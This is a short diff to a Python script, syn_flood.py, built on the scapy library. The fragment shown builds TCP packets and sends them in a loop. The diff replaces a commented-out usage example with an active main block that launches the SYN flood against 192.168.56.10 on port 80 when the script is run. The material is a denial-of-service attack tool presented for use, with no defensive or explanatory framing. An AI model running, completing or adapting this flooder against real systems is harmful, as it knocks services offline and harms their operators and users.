@@ -1,4 +1,3 @@
-# syn_flood.py
 from scapy.all import *
 import random
 
@@ -12,6 +11,6 @@ def syn_flood(target_ip, target_port):
         packet = ip/tcp
         send(packet, verbose=False)
 
-# Example usage:
-# syn_flood("192.168.56.10", 80)
+if __name__ == "__main__":
+    syn_flood("192.168.56.10", 80)
 
